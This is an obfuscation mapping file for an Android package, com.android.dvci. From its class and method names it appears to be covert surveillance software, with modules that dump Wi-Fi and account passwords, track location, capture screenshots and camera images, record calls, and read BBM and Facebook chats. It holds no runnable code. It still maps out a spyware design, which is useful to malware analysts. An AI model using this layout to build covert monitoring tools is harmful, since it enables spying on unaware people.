android.media.AmrInputStream -> android.media.AmrInputStream:
    byte[] unfinished -> fg
    42:44:void specificStop() -> cD
    48:55:void specificGo(int) -> main
    60:87:byte[] getAvailable() -> cH
    101:149:void specificStart() -> cC
    152:158:void createSockets() -> cN
    161:168:void deleteSockets() -> cO
    179:205:void stopRecorder() -> cI
    212:216:void specificSuspend() -> cM
    234:248:void onInfo(android.media.MediaRecorder,int,int) -> onInfo
    254:255:void onError(android.media.MediaRecorder,int,int) -> onError
com.android.dvci.module.ModulePassword -> stt.at:
    com.android.dvci.evidence.Markup markupPassword -> fj
    java.util.HashMap lastPasswords -> fk
    java.util.HashMap services -> fl
    35:50:boolean parse$7813568a(com.android.dvci.conf.ChildConf) -> localvar
    60:65:void actualStart() -> O
    73:125:void actualGo() -> N
    133:169:boolean dumpWifi(java.lang.String) -> signature
    174:178:java.lang.String getValue(java.lang.String) -> getValue
    185:223:void dumpAccounts$459b9629(com.android.dvci.module.ModuleAddressBook$1) -> Code
    233:240:java.lang.String getService(java.lang.String) -> file_size
    246:254:int getServiceId(java.lang.String) -> header_size
    261:261:void actualStop() -> P
    264:269:void addToEvidence(com.android.dvci.evidence.EvidenceBuilder,java.lang.String,java.lang.String,java.lang.String,java.lang.String) -> Code
    25:25:java.util.HashMap access$000(com.android.dvci.module.ModulePassword) -> Code
    25:25:com.android.dvci.evidence.Markup access$100(com.android.dvci.module.ModulePassword) -> localvar
    25:25:java.lang.String access$200(java.lang.String) -> endian_tag
    25:25:void access$300$3319e86f(com.android.dvci.evidence.EvidenceBuilder,java.lang.String,java.lang.String,java.lang.String,java.lang.String) -> localvar
com.android.dvci.module.ModulePassword$1 -> stt.au:
    com.android.dvci.evidence.EvidenceBuilder evidence -> fm
    boolean needToSerialize -> fn
    com.android.dvci.module.ModulePassword this$0 -> fo
    79:83:void close() -> close
    87:113:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.ModulePosition -> stt.av:
    boolean gpsEnabled -> fp
    boolean cellEnabled -> fq
    boolean wifiEnabled -> fr
    java.lang.Object position -> fs
    boolean scanning -> ft
    com.android.dvci.module.ModulePosition$1 wifiReceiver$48665ecd -> fu
    byte[] $ -> lua_repeat
    65:92:boolean parse$7813568a(com.android.dvci.conf.ChildConf) -> localvar
    97:116:void actualStart() -> O
    122:131:void locationWIFI() -> cP
    138:139:void locationGPS() -> cQ
    149:171:void locationCELL() -> cR
    177:207:void onLocationChanged(android.location.Location) -> onLocationChanged
    215:233:void onWifiScan(java.util.List) -> Code
    238:251:byte[] getAdditionalData(int,int) -> instance
    264:292:byte[] messageEvidence(byte[],int) -> sort
    300:346:byte[] getWifiPayload(java.lang.String,java.lang.String,int) -> Code
    356:393:byte[] getCellPayload(com.android.dvci.CellInfo,int) -> Code
    407:483:byte[] getGPSPayload(android.location.Location,long) -> Code
    490:518:void registerWifiScan(android.net.wifi.WifiManager) -> Code
    39:39:boolean access$002$7f2a33dd(com.android.dvci.module.ModulePosition) -> Code
    java.lang.String $(int,int,int) -> localvar
com.android.dvci.module.ModulePosition$1 -> stt.aw:
    android.net.wifi.WifiManager val$wifiManager -> fv
    com.android.dvci.module.ModulePosition this$0 -> fw
    505:514:void onReceive(android.content.Context,android.content.Intent) -> onReceive
com.android.dvci.module.ModuleSnapshot -> stt.ax:
    android.view.Display display -> fx
    java.lang.String cameraSound -> fy
    int quality -> quality
    java.util.concurrent.Semaphore working -> fz
    boolean frameBuffer -> fA
    boolean screenCap -> fB
    byte[] $ -> lua_repeat
    84:107:boolean parse$7813568a(com.android.dvci.conf.ChildConf) -> localvar
    126:166:void actualStart() -> O
    175:211:boolean screencapMethod() -> cS
    229:230:android.graphics.Bitmap readPng(com.android.dvci.file.AutoFile) -> instance
    238:370:boolean frameBufferMethod() -> cT
    375:380:boolean isBlack(byte[]) -> lua_return
    384:398:boolean isTablet() -> cU
    402:419:boolean usesInvertedColors() -> cV
    423:439:byte[] getAdditionalData() -> cJ
    444:461:byte[] toJpeg(android.graphics.Bitmap) -> Code
    466:500:byte[] getRawBitmap() -> cW
    java.lang.String $$24d420ae() -> proto_ids
com.android.dvci.module.NullModule -> stt.ay:
    16:16:boolean parse$7813568a(com.android.dvci.conf.ChildConf) -> localvar
    24:24:void actualGo() -> N
    31:31:void actualStart() -> O
    38:38:void actualStop() -> P
com.android.dvci.module.ProcessObserver -> stt.az:
    com.android.dvci.module.ModuleMic module$a50c108 -> fC
    com.android.dvci.event.BaseEvent event -> fD
    22:25:int notification(com.android.dvci.ProcessInfo) -> Code
    7:7:int notification(java.lang.Object) -> Code
com.android.dvci.module.StandByObserver -> stt.aA:
    com.android.dvci.module.ModuleMic moduleMic -> fE
    16:16:int notification(com.android.dvci.Standby) -> Code
    6:6:int notification(java.lang.Object) -> Code
com.android.dvci.module.SubModule -> stt.aB:
    com.android.dvci.evidence.Markup markup -> magic
    com.android.dvci.module.ModuleChat module$a50c108 -> fF
    boolean enabled -> enabled
    14:17:void init$4ddb0c1b(com.android.dvci.module.ModuleChat,com.android.dvci.evidence.Markup) -> Code
    void start() -> start
    40:40:int notification(com.android.dvci.ProcessInfo) -> Code
    44:44:void startListen() -> cX
    47:47:void stopListen() -> cY
com.android.dvci.module.SubModuleManager -> stt.aC:
    com.android.dvci.module.ModuleChat module$a50c108 -> fF
    java.util.ArrayList submodules$7865b31 -> fG
    29:33:void add$62fcb526(com.android.dvci.module.chat.SubModuleChat) -> Code
    36:49:boolean start() -> cZ
    53:65:boolean stop() -> da
    69:72:boolean go() -> db
    84:100:int notification(com.android.dvci.ProcessInfo) -> Code
com.android.dvci.module.call.CallInfo -> stt.aD:
    int id -> id
    java.lang.String account -> fH
    java.lang.String peer -> fI
    java.lang.String displayName -> fJ
    boolean incoming -> mylist
    boolean valid -> openfile
    java.lang.String processName -> processName
    int programId -> fK
    java.util.Date timestamp -> cr
    boolean delay -> fL
    boolean realRate -> fM
    long[] streamId -> fN
    java.util.Date begin -> fO
    java.util.Date end -> fP
    31:34:java.lang.String getCaller() -> dc
    38:41:java.lang.String getCallee() -> dd
    45:46:long getStreamId(boolean) -> openfile
    51:66:boolean setStreamId(boolean,long) -> Code
    71:85:boolean setStreamPid(int) -> lua
    91:170:boolean update(boolean) -> closefile
com.android.dvci.module.call.Chunk -> stt.aE:
    java.lang.String encodedFile -> fQ
    java.util.Date begin -> fO
    java.util.Date end -> fP
    boolean remote -> fR
    int channel -> fS
com.android.dvci.module.call.EncodingTask -> stt.aF:
    com.android.dvci.module.ModuleCall moduleCall -> fT
    java.lang.Object sync -> ek
    java.util.concurrent.LinkedBlockingQueue queue$19f590b5 -> fU
    boolean stopQueueMonitor -> fV
    32:36:void stop() -> stop
    39:47:void wake() -> de
    52:97:void run() -> run
    13:13:int notification(java.lang.Object) -> Code
com.android.dvci.module.call.RecordCall -> stt.aG:
    com.android.dvci.module.call.RecordCall singleton -> fW
    java.lang.String currentRecordFile -> fX
    int strategy -> fY
    android.media.MediaRecorder recorder -> bK
    32:36:com.android.dvci.module.call.RecordCall self() -> df
    196:219:boolean startRecord$2f10955c(int,java.lang.String) -> localclass
    223:234:boolean stopRecord() -> dg
    238:287:boolean isSupported(com.android.dvci.module.ModuleCall) -> localvar
    291:352:boolean recordCall(com.android.dvci.module.ModuleCall,com.android.dvci.Call,boolean) -> Code
    21:21:java.lang.String access$000(com.android.dvci.module.call.RecordCall) -> Code
com.android.dvci.module.call.RecordCall$1 -> stt.aH:
    com.android.dvci.module.ModuleCall val$module -> fZ
    com.android.dvci.Call val$call -> ga
    boolean val$incoming -> gb
    com.android.dvci.module.call.RecordCall this$0 -> gc
    295:298:void run() -> run
com.android.dvci.module.camera.CameraSnapshot -> stt.aI:
    java.lang.Object cameraLock -> gd
    com.android.dvci.module.camera.CameraSnapshot singleton -> ge
    java.util.Hashtable enable -> gf
    com.android.dvci.module.camera.CameraSnapshot$1 autofocusCallback$5be0d91 -> gg
    com.android.dvci.module.camera.CameraSnapshot$2 errorCallback$589e2cd2 -> gh
    android.graphics.SurfaceTexture surface -> gi
    com.android.dvci.module.camera.CameraSnapshot$3 previewCallback$2a23b5ee -> gj
    104:107:com.android.dvci.module.camera.CameraSnapshot self() -> dh
    209:259:void snapshot(int) -> lua_main
    264:303:android.hardware.Camera openCamera(int) -> lua_and
    314:350:android.hardware.Camera prepareCamera$5b4daced(int) -> lua_break
    365:388:void choosePreviewSize$30a3c8c2(android.hardware.Camera$Parameters) -> Code
    437:454:android.hardware.Camera$Size getBestPreviewSize$3198ce76(android.hardware.Camera$Parameters) -> localvar
    459:467:boolean isBlack(byte[]) -> lua_return
    475:490:boolean releaseCamera(android.hardware.Camera) -> Code
    67:67:boolean access$000$3234f0de(byte[]) -> lua_then
    67:67:boolean access$100(com.android.dvci.module.camera.CameraSnapshot,android.hardware.Camera) -> Code
    67:67:java.lang.Object access$200(com.android.dvci.module.camera.CameraSnapshot) -> Code
com.android.dvci.module.camera.CameraSnapshot$1 -> stt.aJ:
    com.android.dvci.module.camera.CameraSnapshot this$0 -> gk
    78:81:void onAutoFocus(boolean,android.hardware.Camera) -> onAutoFocus
com.android.dvci.module.camera.CameraSnapshot$2 -> stt.aK:
    com.android.dvci.module.camera.CameraSnapshot this$0 -> gk
    90:90:void onError(int,android.hardware.Camera) -> onError
com.android.dvci.module.camera.CameraSnapshot$3 -> stt.aL:
    com.android.dvci.module.camera.CameraSnapshot this$0 -> gk
    167:191:void onPreviewFrame(byte[],android.hardware.Camera) -> onPreviewFrame
com.android.dvci.module.camera.CameraSnapshot$3$1CCD -> stt.aM:
    byte[] bytes -> gl
    android.hardware.Camera$Parameters cameraParms -> gm
    android.hardware.Camera$Size size -> gn
    com.android.dvci.module.camera.CameraSnapshot$3 this$1 -> go
    138:161:void run() -> run
com.android.dvci.module.chat.ChatBBM -> stt.aN:
    int version -> version
    java.lang.String pObserving -> eY
    java.lang.String dbFileMaster -> gp
    java.lang.String dbFileGroup -> gq
    long lastBBM -> gr
    java.util.concurrent.Semaphore readChatSemaphore -> gs
    com.android.dvci.module.chat.ChatBBM$Account account -> gt
    boolean firstTime -> gu
    boolean started -> started
    byte[] $ -> lua_repeat
    63:63:int getProgramId() -> di
    68:68:java.lang.String getObservingProgram() -> dj
    76:77:void notifyStopProgram(java.lang.String) -> link_size
    84:120:void updateHistory() -> dk
    130:170:void start() -> start
    176:186:int getBBMVersion(com.android.dvci.db.GenericSqliteHelper) -> Code
    190:203:long readBBMChatHistory(com.android.dvci.db.GenericSqliteHelper) -> localvar
    207:220:long readBBMGroupHistory() -> dl
    227:312:long readBBMConversationHistory(com.android.dvci.db.GenericSqliteHelper) -> localclass
    317:338:void readAddressContacts(com.android.dvci.db.GenericSqliteHelper) -> instance
    342:358:void readAddressContactsUserPins(com.android.dvci.db.GenericSqliteHelper) -> inst
    362:377:void readAddressContactsUsers(com.android.dvci.db.GenericSqliteHelper) -> variables
    381:397:void readLocalContact(com.android.dvci.db.GenericSqliteHelper) -> mylist
    25:25:com.android.dvci.module.chat.ChatBBM$Account access$000(com.android.dvci.module.chat.ChatBBM) -> Code
    java.lang.String $(int,int,int) -> localvar
com.android.dvci.module.chat.ChatBBM$1 -> stt.aO:
    int[] val$type -> gv
    com.android.dvci.module.chat.ChatBBM this$0 -> gw
    180:181:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatBBM$2 -> stt.aP:
    com.android.dvci.module.chat.ChatGroups val$groups -> gx
    java.lang.String val$me_number -> gy
    java.lang.String val$me_name -> gz
    java.util.ArrayList val$messages -> gA
    com.android.dvci.module.chat.ChatBBM this$0 -> gw
    265:292:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatBBM$3 -> stt.aQ:
    com.android.dvci.module.chat.ChatBBM this$0 -> gw
    346:353:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatBBM$4 -> stt.aR:
    com.android.dvci.module.chat.ChatBBM this$0 -> gw
    365:372:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatBBM$5 -> stt.aS:
    com.android.dvci.module.chat.ChatBBM this$0 -> gw
    388:391:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatBBM$Account -> stt.aN$Code:
    int id -> id
    java.lang.String displayName -> fJ
    java.lang.String pin -> pin
    com.android.dvci.module.chat.ChatBBM this$0 -> gw
    39:39:java.lang.String getName() -> getName
com.android.dvci.module.chat.ChatFacebook -> stt.aT:
    java.lang.String pObserving -> eY
    java.util.Hashtable lastFb -> gB
    java.util.concurrent.Semaphore readChatSemaphore -> gs
    java.lang.String account_uid -> gC
    java.lang.String account_name -> gD
    java.lang.String dirKatana -> gE
    java.lang.String dirOrca -> gF
    java.util.Hashtable contacts -> gG
    53:53:int getProgramId() -> di
    58:58:java.lang.String getObservingProgram() -> dj
    63:67:void notifyStopProgram(java.lang.String) -> link_size
    71:79:void start() -> start
    85:90:boolean fetchFb(java.lang.String) -> link_off
    102:146:boolean readMyAccount(java.lang.String) -> map_off
    152:219:void readFbMessageHistory(java.lang.String) -> string_ids_size
    224:242:void readFB(com.android.dvci.db.GenericSqliteHelper,java.lang.String) -> Code
    245:312:long fetchMessages(java.lang.String,com.android.dvci.db.GenericSqliteHelper,com.android.dvci.module.chat.FbConversation,long) -> Code
    320:333:void updateMarkupFb$44be42cf(java.lang.String,long) -> Code
    336:337:void saveEvidence(java.util.ArrayList) -> inst
    340:382:java.util.ArrayList getFbConversations$158fbcc4(java.lang.String,com.android.dvci.db.GenericSqliteHelper,java.lang.String) -> Code
    389:399:void readAddressUser(java.lang.String) -> string_ids_off
    405:426:void readAddressContacts(java.lang.String) -> type_ids_size
    429:441:com.android.dvci.module.chat.Contact json2Contact(java.lang.String) -> type_ids_off
    445:466:com.android.dvci.module.chat.Contact[] json2Contacts(java.lang.String) -> proto_ids_size
